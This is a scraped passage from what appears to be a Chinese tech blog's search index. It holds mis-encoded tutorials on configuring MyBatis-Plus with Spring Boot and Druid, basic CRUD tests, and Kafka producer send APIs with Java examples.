com.mysql.cj.jdbc.Driver url: jdbc:mysql://127.0.0.1:3306/mybatis_plus_lesson?characterEncoding=utf8&amp;autoReconnect=true&amp;useSSL=false&amp;useUnicode=true&amp;useJDBCCompliantTimezoneShift=true&amp;useLegacyDatetimeCode=false&amp;serverTimezone=UTC username: root password: 123456 initial-size: 10 max-active: 100 min-idle: 10 max-wait: 60000 pool-prepared-statements: true max-pool-prepared-statement-per-connection-size: 20 time-between-eviction-runs-millis: 60000 min-evictable-idle-time-millis: 300000 validation-query: SELECT 1 test-while-idle: true test-on-borrow: false test-on-return: false stat-view-servlet: enabled: false url-pattern: /druid/* login-username: admin login-password: 123456 filter: stat: log-slow-sql: true slow-sql-millis: 1000 merge-sql: false wall: config: multi-statement-allow: true# MyBatis-Plus é…ç½®mybatis-plus: mapper-locations: classpath*:/mapper/**/*.xml typeAliasesPackage: com.clay.mybatis.bean # MyBatis-Plus å…¨å±€é…ç½® global-config: id-type: 0 field-strategy: 2 db-column-underline: true table-prefix: t_ # MyBatis åŸç”Ÿé…ç½® configuration: jdbc-type-for-null: \'null\' map-underscore-to-camel-case: true log-impl: org.apache.ibatis.logging.stdout.StdOutImpllogging: level: com.clay.mybatis.dao: debug MyBatis-Plus 3.x ç‰ˆæœ¬é…ç½®æç¤º MyBatis-Plus 3.x çš„ SpringBoot è¯¦ç»†é…ç½®å‚æ•°å¯çœ‹ è¿™é‡Œã€‚ å½“ä½¿ç”¨çš„ MyBatis-Plus ä¸º 3.x ç‰ˆæœ¬æ—¶ï¼ˆå¦‚ 3.5.2 ç‰ˆæœ¬ï¼‰ï¼Œå…·ä½“çš„é…ç½®å†…å®¹å¦‚ä¸‹ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455spring: # Druid æ•°æ®æºé…ç½® datasource: type: com.alibaba.druid.pool.DruidDataSource druid: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://127.0.0.1:3306/mybatis_plus_lesson?characterEncoding=utf8&amp;autoReconnect=true&amp;useSSL=false&amp;useUnicode=true&amp;useJDBCCompliantTimezoneShift=true&amp;useLegacyDatetimeCode=false&amp;serverTimezone=UTC username: root password: 123456 initial-size: 10 max-active: 100 min-idle: 10 max-wait: 60000 pool-prepared-statements: true max-pool-prepared-statement-per-connection-size: 20 time-between-eviction-runs-millis: 60000 min-evictable-idle-time-millis: 300000 validation-query: SELECT 1 test-while-idle: true test-on-borrow: false test-on-return: false stat-view-servlet: enabled: false url-pattern: /druid/* login-username: admin login-password: 123456 filter: stat: log-slow-sql: true slow-sql-millis: 1000 merge-sql: false wall: config: multi-statement-allow: true# MyBatis-Plus é…ç½®mybatis-plus: mapper-locations: classpath*:/mapper/**/*.xml typeAliasesPackage: com.clay.mybatis.bean # MyBatis-Plus å…¨å±€é…ç½® global-config: banner: false db-config: id-type: AUTO tablePrefix: t_ tableUnderline: true # MyBatis åŸç”Ÿé…ç½® configuration: jdbc-type-for-null: \'null\' map-underscore-to-camel-case: true log-impl: org.apache.ibatis.logging.stdout.StdOutImpllogging: level: com.clay.mybatis.dao: debug é€šç”¨ CRUD ä»£ç åœ¨é¡¹ç›®å¼€å‘ä¸­ï¼Œä½¿ç”¨ MyBatis ä¸ MyBatis-Plus ç¼–å†™ CRUD ä»£ç çš„åŒºåˆ«ï¼š åŸºäº Mybatis çš„æ–¹å¼ éœ€è¦ç¼–å†™ Mapper æ¥å£ï¼Œå¹¶æ‰‹åŠ¨ç¼–å†™ CRUD æ–¹æ³• æä¾› SQL æ˜ å°„æ–‡ä»¶ï¼Œå¹¶æ‰‹åŠ¨ç¼–å†™æ¯ä¸ª CRUD æ–¹æ³•å¯¹åº”çš„ SQL è¯­å¥ åŸºäº MyBatis-Plus çš„æ–¹å¼ ç®€å•çš„ CRUD ä¸šåŠ¡åªéœ€è¦åˆ›å»º Mapper æ¥å£ï¼Œå¹¶ç»§æ‰¿ BaseMapper æ¥å£ï¼Œè¿™å°±æ˜¯ä½¿ç”¨ MyBatis-Plus æ‰€éœ€è¦çš„æ“ä½œï¼Œç”šè‡³å¯ä»¥ä¸åˆ›å»º SQL æ˜ å°„æ–‡ä»¶ JavaBean ç±»123456789public class Employee { private Long id; private String lastName; private String gender; private String email; private Integer age;} Mapper æ¥å£12345public interface EmployeeMapper extends BaseMapper&lt;Employee&gt; { public Employee getById(Long id);} SQL æ˜ å°„æ–‡ä»¶1234567891011121314&lt;?xml version="1.0" encoding="UTF-8" ?&gt;&lt;!DOCTYPE mapper PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN" "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;&lt;mapper namespace="com.clay.mybatis.dao.EmployeeMapper"&gt; &lt;select id="getById" parameterType="Long" resultType="Employee"&gt; select id, last_name as lastName, gender, email, age from t_employee where id = #{id} &lt;/select&gt;&lt;/mapper&gt; SpringBoot å¯åŠ¨ç±»é€šè¿‡ @MapperScan æ³¨è§£æ¥æ‰«æ Mapper æ¥å£ã€‚ 123456789@SpringBootApplication@MapperScan("com.clay.mybatis.dao")public class MyBatisPlusApplication { public static void main(String[] args) { SpringApplication.run(MyBatisPlusApplication.class, args); }} Junit å•å…ƒæµ‹è¯•ç±»1234567891011121314151617181920212223242526272829@SpringBootTestpublic class MyBatisPlusApplicationTest { @Autowired private EmployeeMapper empMapper; @Test public void select() { Employee employee = empMapper.selectById(1L); Assert.notNull(employee, "entity not be null"); System.out.println(employee); } @Test public void insert() { Employee employee = new Employee("David", "1", "david@gmail.com", 23); Integer insertResult = empMapper.insert(employee); Assert.isTrue(insertResult &gt; 0, ""); System.out.println("insert result: " + insertResult); } @Test public void getById() { Employee employee = empMapper.getById(1L); Assert.notNull(employee, "entity not be null"); System.out.println(employee); }} æ‰§è¡Œä¸Šè¿°çš„å•å…ƒæµ‹è¯•ä»£ç åï¼Œè‹¥æ§åˆ¶å°è¾“å‡ºä¸‹é¢ç±»ä¼¼çš„æ—¥å¿—ä¿¡æ¯ï¼Œåˆ™è¯´æ˜ SpringBoot ä¸ MyBatis-Plus æ­£å¸¸å·¥ä½œã€‚ 123456789101112131415161718==&gt; Preparing: INSERT INTO t_employee ( last_name, gender, email, age ) VALUES ( ?, ?, ?, ? )==&gt; Parameters: David(String), 1(String), david@gmail.com(String), 23(Integer)&lt;== Updates: 1insert result: 1==&gt; Preparing: SELECT id,last_name,gender,email,age FROM t_employee WHERE id=?==&gt; Parameters: 1(Long)&lt;== Columns: id, last_name, gender, email, age&lt;== Row: 1, Jim, 1, jim@gmail.com, 26&lt;== Total: 1Employee [id=1, lastName=Jim, gender=1, email=jim@gmail.com, age=26]==&gt; Preparing: select id, last_name as lastName, gender, email, age from t_employee where id = ?==&gt; Parameters: 1(Long)&lt;== Columns: id, lastName, gender, email, age&lt;== Row: 1, Jim, 1, jim@gmail.com, 26&lt;== Total: 1Employee [id=1, lastName=Jim, gender=1, email=jim@gmail.com, age=26] var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java æ•°æ®åº“"},{title:"MyBatis æºç åˆ†æ",url:"/posts/9a55ed5d.html",text:'var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java æ•°æ®åº“ åœ¨çº¿ç”µå­ä¹¦"},{title:"Kafka å…¥é—¨æ•™ç¨‹ä¹‹äºŒ",url:"/posts/60ddcede.html",text:'Kafka ç”Ÿäº§è€…ç”Ÿäº§è€…æ¶ˆæ¯å‘é€æµç¨‹ç”Ÿäº§è€…æ¶ˆæ¯å‘é€åŸç†Kafka çš„ Producer å‘é€æ¶ˆæ¯é‡‡ç”¨çš„æ˜¯å¼‚æ­¥å‘é€çš„æ–¹å¼ã€‚åœ¨æ¶ˆæ¯å‘é€çš„è¿‡ç¨‹ä¸­ï¼Œæ¶‰åŠåˆ°äº†ä¸¤ä¸ªçº¿ç¨‹ â€” main çº¿ç¨‹å’Œ Sender çº¿ç¨‹ã€‚åœ¨ main çº¿ç¨‹ä¸­ï¼Œä¼šåˆ›å»ºä¸€ä¸ªåŒç«¯é˜Ÿåˆ— RecordAccumulatorã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œmain çº¿ç¨‹å°†æ¶ˆæ¯å‘é€ç»™ RecordAccumulator æ—¶ï¼ŒSender çº¿ç¨‹ä¼šä¸æ–­ä» RecordAccumulator ä¸­æ‹‰å–æ¶ˆæ¯å¹¶å‘é€åˆ° Kafka Brokerã€‚ ç”Ÿäº§è€…é‡è¦å‚æ•°åˆ—è¡¨ ç”Ÿäº§è€…å¼‚æ­¥å‘é€ APIæ™®é€šçš„å¼‚æ­¥å‘é€æç¤º æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ kafka-lesson-01ã€‚ Maven ä¾èµ– 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt; &lt;artifactId&gt;kafka-clients&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt;&lt;/dependency&gt; Java ä»£ç  123456789101112131415161718192021public class CustomerProducer { public static void main(String[] args) { Properties properties = new Properties(); // æŒ‡å®šKafkaé›†ç¾¤çš„è¿æ¥ä¿¡æ¯ properties.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, "127.0.0.1:9092,127.0.0.1:9093"); // æŒ‡å®šåºåˆ—åŒ–å™¨ï¼ˆå¿…éœ€ï¼‰ properties.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); properties.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); // åˆ›å»ºç”Ÿäº§è€…å¯¹è±¡ KafkaProducer&lt;String, String&gt; producer = new KafkaProducer&lt;&gt;(properties); for (int i = 0; i &lt; 5; i++) { // å¼‚æ­¥å‘é€æ¶ˆæ¯ producer.send(new ProducerRecord&lt;&gt;("test", "hello kafka " + i)); } // å…³é—­èµ„æº producer.close(); }} æµ‹è¯•ä»£ç  ç¬¬ä¸€æ­¥ï¼šå¯åŠ¨ Kafka çš„æ§åˆ¶å°æ¶ˆè´¹è€…ï¼š 1# ./kafka-console-consumer.sh --bootstrap-server 127.0.0.1:9092 --topic test ç¬¬äºŒæ­¥ï¼šåœ¨ IDE å·¥å…·ä¸­æ‰§è¡Œä»£ç ï¼Œè§‚å¯Ÿæ§åˆ¶å°æ¶ˆè´¹è€…ä¸­æ˜¯å¦æ¥æ”¶åˆ°æ¶ˆæ¯ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 12345hello kafka 0hello kafka 1hello kafka 2hello kafka 3hello kafka 4 å¸¦å›è°ƒå‡½æ•°çš„å¼‚æ­¥å‘é€å›è°ƒæ–¹æ³•ä¼šåœ¨ Producer æ”¶åˆ° ack æ—¶è°ƒç”¨ï¼Œä¸”ä¸ºå¼‚æ­¥è°ƒç”¨ï¼›è¯¥æ–¹æ³•æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯å…ƒæ•°æ®ä¿¡æ¯ï¼ˆRecordMetadataï¼‰å’Œå¼‚å¸¸ä¿¡æ¯ï¼ˆExceptionï¼‰ã€‚å¦‚æœ Exception ä¸º nullï¼Œåˆ™è¯´æ˜æ¶ˆæ¯å‘é€æˆåŠŸï¼Œå¦‚æœ Exception ä¸ä¸º nullï¼Œåˆ™è¯´æ˜æ¶ˆæ¯å‘é€å¤±è´¥ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œæ¶ˆæ¯å‘é€å¤±è´¥ä¼šè‡ªåŠ¨é‡è¯•å‘é€ï¼Œä¸éœ€è¦åœ¨å›è°ƒå‡½æ•°ä¸­æ‰‹åŠ¨é‡è¯•å‘é€ã€‚ Java ä»£ç  12345678910111213141516171819202122232425262728public class CustomerProducer2 { public static void main(String[] args) { Properties properties = new Properties(); // æŒ‡å®šKafkaé›†ç¾¤çš„è¿æ¥ä¿¡æ¯ properties.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, "127.0.0.1:9092,127.0.0.1:9093"); // æŒ‡å®šåºåˆ—åŒ–å™¨ï¼ˆå¿…éœ€ï¼‰ properties.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); properties.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); // åˆ›å»ºç”Ÿäº§è€…å¯¹è±¡ KafkaProducer&lt;String, String&gt; producer = new KafkaProducer&lt;&gt;(properties); for (int i = 0; i &lt; 5; i++) { // å¼‚æ­¥å‘é€æ¶ˆæ¯ï¼ˆå¸¦å›è°ƒå‡½æ•°ï¼‰ producer.send(new ProducerRecord&lt;&gt;("test", "hello kafka " + i), new Callback() { @Override public void onCompletion(RecordMetadata recordMetadata, Exception exception) { if (exception == null) { System.out.println("topic: " + recordMetadata.topic() + ", partition: " + recordMetadata.partition()); } } }); } // å…³é—­èµ„æº producer.close(); }} æµ‹è¯•ä»£ç  é™¤äº†åœ¨ Kafka çš„æ§åˆ¶å°æ¶ˆè´¹è€…ä¸­æ¥æ”¶åˆ°æ¶ˆæ¯ä¹‹å¤–ï¼Œè¿˜å¯ä»¥åœ¨ IDE çš„æ§åˆ¶å°çœ‹åˆ°å¦‚ä¸‹çš„è¾“å‡ºä¿¡æ¯ï¼š 12345topic: test, partition: 0topic: test, partition: 0topic: test, partition: 0topic: test, partition: 0topic: test, partition: 0 ç”Ÿäº§è€…åŒæ­¥å‘é€ APIæç¤º æœ¬èŠ‚æ‰€éœ€çš„æ¡ˆä¾‹ä»£ç ï¼Œå¯ä»¥ç›´æ¥ä» GitHub ä¸‹è½½å¯¹åº”ç« èŠ‚ kafka-lesson-02ã€‚ æ™®é€šçš„åŒæ­¥å‘é€åŒæ­¥å‘é€çš„æ„æ€å°±æ˜¯ï¼Œå½“ä¸€æ¡æ¶ˆæ¯å‘é€ä¹‹åï¼Œä¼šé˜»å¡å½“å‰çº¿ç¨‹ï¼Œç›´è‡³æ”¶åˆ° ack åº”ç­”ã€‚ç”±äº send() æ–¹æ³•è¿”å›çš„æ˜¯ä¸€ä¸ª Future å¯¹è±¡ï¼Œæ ¹æ® Futrue å¯¹è±¡çš„ç‰¹ç‚¹ï¼Œåªéœ€è°ƒç”¨ Future å¯¹è±¡çš„ get() æ–¹æ³•å³å¯å®ç°åŒæ­¥å‘é€ã€‚ Maven ä¾èµ– 12345&lt;dependency&gt; &lt;groupId&gt;org.apache.kafka&lt;/groupId&gt; &lt;artifactId&gt;kafka-clients&lt;/artifactId&gt; &lt;version&gt;3.2.1&lt;/version&gt;&lt;/dependency&gt; Java ä»£ç  12345678910111213141516171819202122232425public class CustomerProducer { public static void main(String[] args) { Properties properties = new Properties(); // æŒ‡å®šKafkaé›†ç¾¤çš„è¿æ¥ä¿¡æ¯ properties.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, "127.0.0.1:9092,127.0.0.1:9093"); // æŒ‡å®šåºåˆ—åŒ–å™¨ï¼ˆå¿…éœ€ï¼‰ properties.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); properties.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); // åˆ›å»ºç”Ÿäº§è€…å¯¹è±¡ KafkaProducer&lt;String, String&gt; producer = new KafkaProducer&lt;&gt;(properties); for (int i = 0; i &lt; 5; i++) { // åŒæ­¥å‘é€æ¶ˆæ¯ try { producer.send(new ProducerRecord&lt;&gt;("test", "hello kafka " + i)).get(); } catch (Exception e) { e.printStackTrace(); } } // å…³é—­èµ„æº producer.close(); }} æµ‹è¯•ä»£ç  ç¬¬ä¸€æ­¥ï¼šå¯åŠ¨ Kafka çš„æ§åˆ¶å°æ¶ˆè´¹è€…ï¼š 1# ./kafka-console-consumer.sh --bootstrap-server 127.0.0.1:9092 --topic test ç¬¬äºŒæ­¥ï¼šåœ¨ IDE å·¥å…·ä¸­æ‰§è¡Œä»£ç ï¼Œè§‚å¯Ÿæ§åˆ¶å°æ¶ˆè´¹è€…ä¸­æ˜¯å¦æ¥æ”¶åˆ°æ¶ˆæ¯ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š 12345hello kafka 0hello kafka 1hello kafka 2hello kafka 3hello kafka 4 å¸¦å›è°ƒå‡½æ•°çš„åŒæ­¥å‘é€1234567891011121314151617181920212223242526272829303132public class CustomerProducer2 { public static void main(String[] args) { Properties properties = new Properties(); // æŒ‡å®šKafkaé›†ç¾¤çš„è¿æ¥ä¿¡æ¯ properties.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, "127.0.0.1:9092,127.0.0.1:9093"); // æŒ‡å®šåºåˆ—åŒ–å™¨ï¼ˆå¿…éœ€ï¼‰ properties.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); properties.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); // åˆ›å»ºç”Ÿäº§è€…å¯¹è±¡ KafkaProducer&lt;String, String&gt; producer = new KafkaProducer&lt;&gt;(properties); for (int i = 0; i &lt; 5; i++) { // åŒæ­¥å‘é€æ¶ˆæ¯ï¼ˆå¸¦å›è°ƒå‡½æ•°ï¼‰ try { producer.send(new ProducerRecord&lt;&gt;("test", "hello kafka " + i), new Callback() { @Override public void onCompletion(RecordMetadata recordMetadata, Exception exception) { if (exception == null) { System.out.println("topic: " + recordMetadata.topic() + ", partition: " + recordMetadata.partition()); } } }).get(); } catch (Exception e) { e.printStackTrace(); } } // å…³é—­èµ„æº producer.close(); }} æµ‹è¯•ä»£ç  é™¤äº†åœ¨ Kafka çš„æ§åˆ¶å°æ¶ˆè´¹è€…ä¸­æ¥æ”¶åˆ°æ¶ˆæ¯ä¹‹å¤–ï¼Œè¿˜å¯ä»¥åœ¨ IDE çš„æ§åˆ¶å°çœ‹åˆ°å¦‚ä¸‹çš„è¾“å‡ºä¿¡æ¯ï¼š 12345topic: test, partition: 0topic: test, partition: 2topic: test, partition: 0topic: test, partition: 1topic: test, partition: 2 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"åˆ†å¸ƒå¼"},{title:"Kafka å…¥é—¨æ•™ç¨‹ä¹‹ä¸€",url:"/posts/b6be8183.html",text:'æ¶ˆæ¯é˜Ÿåˆ—ç›®å‰ä¼ä¸šä¸­æ¯”è¾ƒå¸¸è§çš„æ¶ˆæ¯é˜Ÿåˆ—äº§å“ä¸»è¦æœ‰ Kafkaã€ActiveMQã€RabbitMQã€RocketMQ ç­‰ã€‚åœ¨å¤§æ•°æ®åœºæ™¯ä¸»è¦é‡‡ç”¨ Kafka ä½œä¸ºæ¶ˆæ¯é˜Ÿåˆ—ï¼Œè€Œåœ¨ JavaEE å¼€å‘ä¸­ä¸»è¦é‡‡ç”¨ ActiveMQã€RabbitMQã€RocketMQã€‚ æ¶ˆæ¯é˜Ÿåˆ—çš„ä¼˜åŠ¿ è§£è€¦ - å…è®¸ç‹¬ç«‹çš„æ‰©å±•æˆ–ä¿®æ”¹ä¸¤è¾¹çš„å¤„ç†è¿‡ç¨‹ï¼Œåªè¦ç¡®ä¿å®ƒä»¬éµå®ˆåŒæ ·çš„æ¥å£çº¦æŸ ç¼“å†² - æœ‰åŠ©äºæ§åˆ¶å’Œä¼˜åŒ–æ•°æ®æµç»è¿‡ç³»ç»Ÿçš„é€Ÿåº¦ï¼Œè§£å†³ç”Ÿäº§æ¶ˆæ¯å’Œæ¶ˆè´¹æ¶ˆæ¯çš„å¤„ç†é€Ÿåº¦ä¸ä¸€è‡´çš„æƒ…å†µ æ¶ˆå³° - åœ¨è®¿é—®é‡å‰§å¢çš„æƒ…å†µä¸‹ï¼Œåº”ç”¨ä»ç„¶éœ€è¦ç»§ç»­å‘æŒ¥ä½œç”¨ï¼Œä½†æ˜¯è¿™æ ·çš„çªå‘æµé‡å¹¶ä¸å¸¸è§ã€‚å¦‚æœä¸ºä»¥èƒ½å¤„ç†è¿™ç±»å³°å€¼è®¿é—®ä¸ºæ ‡å‡†æ¥æŠ•å…¥èµ„æºå¹¶éšæ—¶å¾…å‘½ï¼Œè¿™æ— ç–‘æ˜¯å·¨å¤§çš„æµªè´¹ã€‚ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—èƒ½å¤Ÿä½¿å…³é”®ç»„ä»¶é¡¶ä½çªå‘çš„è®¿é—®å‹åŠ›ï¼Œè€Œä¸ä¼šå› ä¸ºçªå‘çš„è¶…è´Ÿè·çš„è¯·æ±‚è€Œå®Œå…¨å´©æºƒ å¼‚æ­¥é€šä¿¡ - å¾ˆå¤šæ—¶å€™ï¼Œç”¨æˆ·ä¸æƒ³ä¹Ÿä¸éœ€è¦ç«‹å³å¤„ç†æ¶ˆæ¯ã€‚æ¶ˆæ¯é˜Ÿåˆ—æä¾›äº†å¼‚æ­¥å¤„ç†æœºåˆ¶ï¼Œå…è®¸ç”¨æˆ·æŠŠä¸€ä¸ªæ¶ˆæ¯æ”¾å…¥é˜Ÿåˆ—ï¼Œä½†å¹¶ä¸ç«‹å³å¤„ç†å®ƒã€‚æƒ³å‘é˜Ÿåˆ—ä¸­æ”¾å…¥å¤šå°‘æ¶ˆæ¯å°±æ”¾å¤šå°‘ï¼Œç„¶ååœ¨éœ€è¦çš„æ—¶å€™å†å»å¤„ç†å®ƒä»¬ å¯æ¢å¤æ€§ - ç³»ç»Ÿçš„ä¸€éƒ¨åˆ†ç»„ä»¶å¤±æ•ˆæ—¶ï¼Œä¸ä¼šå½±å“åˆ°æ•´ä¸ªç³»ç»Ÿã€‚æ¶ˆæ¯é˜Ÿåˆ—é™ä½äº†è¿›ç¨‹é—´çš„è€¦åˆåº¦ï¼Œæ‰€ä»¥å³ä½¿ä¸€ä¸ªå¤„ç†æ¶ˆæ¯çš„è¿›ç¨‹æŒ‚æ‰ï¼ŒåŠ å…¥é˜Ÿåˆ—ä¸­çš„æ¶ˆæ¯ä»ç„¶å¯ä»¥åœ¨ç³»ç»Ÿæ¢å¤åè¢«å¤„ç† æ¶ˆæ¯é˜Ÿåˆ—çš„ä¸¤ç§æ¨¡å¼ç‚¹å¯¹ç‚¹æ¨¡å¼ç‚¹å¯¹ç‚¹æ¨¡å¼ å°±æ˜¯ä¸€å¯¹ä¸€ï¼Œæ¶ˆè´¹è€…ä¸»åŠ¨æ‹‰å–æ•°æ®ï¼Œæ¶ˆæ¯æ”¶åˆ°åæ¶ˆæ¯ä¼šè¢«æ¸…é™¤ã€‚æ¶ˆæ¯ç”Ÿäº§è€…å°†æ¶ˆæ¯å‘é€åˆ° Queue ä¸­ï¼Œç„¶åæ¶ˆæ¯æ¶ˆè´¹è€…ä» Queue ä¸­å–å‡ºå¹¶æ¶ˆè´¹æ¶ˆæ¯ã€‚æ¶ˆæ¯è¢«æ¶ˆè´¹ä»¥åï¼ŒQueue ä¸­ä¸å†å­˜å‚¨å®ƒï¼Œæ‰€ä»¥æ¶ˆæ¯æ¶ˆè´¹è€…ä¸å¯èƒ½æ¶ˆè´¹åˆ°å·²ç»è¢«æ¶ˆè´¹çš„æ¶ˆæ¯ã€‚Queue æ”¯æŒå­˜åœ¨å¤šä¸ªæ¶ˆè´¹è€…ï¼Œä½†æ˜¯å¯¹ä¸€ä¸ªæ¶ˆæ¯è€Œè¨€ï¼Œåªä¼šæœ‰ä¸€ä¸ªæ¶ˆè´¹è€…å¯ä»¥æ¶ˆè´¹ã€‚ å‘å¸ƒ / è®¢é˜…æ¨¡å¼å‘å¸ƒ/è®¢é˜…æ¨¡å¼ å°±æ˜¯ä¸€å¯¹å¤šï¼Œæ¶ˆæ¯äº§ç”Ÿåä¸»åŠ¨æ¨é€ç»™è®¢é˜…è€…ï¼Œæ¶ˆè´¹è€…æ¶ˆè´¹æ¶ˆæ¯ä¹‹åä¸ä¼šæ¸…é™¤æ¶ˆæ¯ã€‚æ¶ˆæ¯ç”Ÿäº§è€…ï¼ˆå‘å¸ƒï¼‰å°†æ¶ˆæ¯å‘å¸ƒåˆ° topic ä¸»é¢˜ï¼ˆå¦‚æµè§ˆã€ç‚¹èµã€æ”¶è—ã€è¯„è®ºç­‰ï¼‰ä¸­ï¼ŒåŒæ—¶æœ‰å¤šä¸ªæ¶ˆæ¯æ¶ˆè´¹è€…ï¼ˆè®¢é˜…ï¼‰æ¶ˆè´¹è¯¥æ¶ˆæ¯ã€‚è¿™å’Œç‚¹å¯¹ç‚¹æ¨¡å¼ä¸åŒï¼Œæ¯ä¸ªæ¶ˆè´¹è€…äº’ç›¸ç‹¬ç«‹ï¼Œå‘å¸ƒåˆ° topic çš„æ¶ˆæ¯ä¼šè¢«æ‰€æœ‰è®¢é˜…è€…æ¶ˆè´¹ã€‚ Kafka è¯¦ç»†ä»‹ç»åœ¨æµå¼è®¡ç®—ä¸­ï¼ŒKafka ä¸€èˆ¬ç”¨äºç¼“å­˜æ•°æ®ï¼ŒStorm é€šè¿‡æ¶ˆè´¹ Kafka çš„æ•°æ®æ¥è¿›è¡Œè®¡ç®—ã€‚ Apache Kafka æ˜¯ä¸€ä¸ªå¼€æºçš„åˆ†å¸ƒå¼æ¶ˆæ¯é˜Ÿåˆ—ç³»ç»Ÿï¼Œç”± Scala è¯­è¨€ç¼–å†™ã€‚ Kafka æœ€åˆç”± LinkedIn å…¬å¸å¼€å‘ï¼Œå¹¶äº 2011 å¹´åˆå¼€æºã€‚2012 å¹´ 10 æœˆä» Apache Incubator æ¯•ä¸šï¼Œè¯¥é¡¹ç›®çš„ç›®æ ‡æ˜¯ä¸ºå¤„ç†å®æ—¶æ•°æ®æä¾›ä¸€ä¸ªç»Ÿä¸€ã€é«˜é€šé‡ã€ä½ç­‰å¾…çš„å¹³å°ã€‚ Kafka é›†ç¾¤ç”±å¤šä¸ª Kafka å®ä¾‹ï¼ˆbrokerï¼‰ç»„æˆï¼Œæ— è®ºæ˜¯ Kafka é›†ç¾¤ï¼Œè¿˜æ˜¯ Consumer éƒ½ä¾èµ–äº Zookeeper é›†ç¾¤ä¿å­˜ä¸€äº› meta ä¿¡æ¯ï¼Œä»¥æ­¤æ¥ä¿è¯ç³»ç»Ÿçš„é«˜å¯ç”¨æ€§ã€‚ Kafka æ¦‚è¿° ä¼ ç»Ÿå®šä¹‰ï¼šKafka æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼çš„åŸºäºå‘å¸ƒ / è®¢é˜…æ¨¡å¼çš„æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆMessage Queueï¼‰ï¼Œä¸»è¦åº”ç”¨äºå¤§æ•°æ®å®æ—¶å¤„ç†é¢†åŸŸã€‚ æœ€æ–°å®šä¹‰ï¼šKafka æ˜¯ä¸€ä¸ªå¼€æºçš„åˆ†å¸ƒå¼äº‹ä»¶æµå¹³å°ï¼ˆEventStreaming Platformï¼‰ï¼Œè¢«æ•°åƒå®¶å…¬å¸ç”¨äºé«˜æ€§èƒ½æ•°æ®ç®¡é“ã€æµåˆ†æã€æ•°æ®é›†æˆå’Œå…³é”®ä»»åŠ¡åº”ç”¨ã€‚ Kafka å­¦ä¹ è·¯çº¿ Kafka å­¦ä¹ è·¯çº¿ Kafka åŸºç¡€æ¶æ„ Producerï¼šæ¶ˆæ¯ç”Ÿäº§è€…ï¼Œå°±æ˜¯å‘ Kafka Broker å‘æ¶ˆæ¯çš„å®¢æˆ·ç«¯ã€‚ Consumerï¼šæ¶ˆæ¯æ¶ˆè´¹è€…ï¼Œå°±æ˜¯å‘ Kafka Broker å–æ¶ˆæ¯çš„å®¢æˆ·ç«¯ã€‚ Consumer Group (CG)ï¼šæ¶ˆè´¹è€…ç»„ï¼Œç”±å¤šä¸ª consumer 